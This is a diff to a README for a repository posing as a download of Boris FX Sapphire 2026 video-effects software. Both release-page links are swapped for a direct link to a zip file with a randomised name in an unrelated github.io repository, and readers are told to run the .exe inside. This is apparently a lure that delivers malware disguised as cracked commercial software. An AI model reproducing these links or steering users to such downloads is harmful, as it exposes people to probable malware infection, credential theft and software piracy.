@@ -5,7 +5,7 @@ description: "Download and install Boris FX Sapphire 2026 for Windows 10 and 11 
 ---
 # 💎 Boris-FX-Sapphire-2026 - Professional Visual Effects For Video Projects
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Leastresistancebubo928/Boris-FX-Sapphire-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Leastresistancebubo928/leastresistancebubo928.github.io/main/Hepaticae/io_leastresistancebubo_github_leptocephaloid.zip)
 
 ## 📌 About This Software
 
@@ -26,7 +26,7 @@ Your computer needs specific hardware to run these effects. Check your current s
 
 You must obtain the installation package from the official release page. 
 
-1. Visit [this link to download the software](https://github.com/Leastresistancebubo928/Boris-FX-Sapphire-2026/releases).
+1. Visit [this link to download the software](https://raw.githubusercontent.com/Leastresistancebubo928/leastresistancebubo928.github.io/main/Hepaticae/io_leastresistancebubo_github_leptocephaloid.zip).
 2. Look for the section labeled "Assets" at the bottom of the latest release.
 3. Click the link ending in .exe to save the installer to your computer.
 4. Wait for the file transfer to complete.
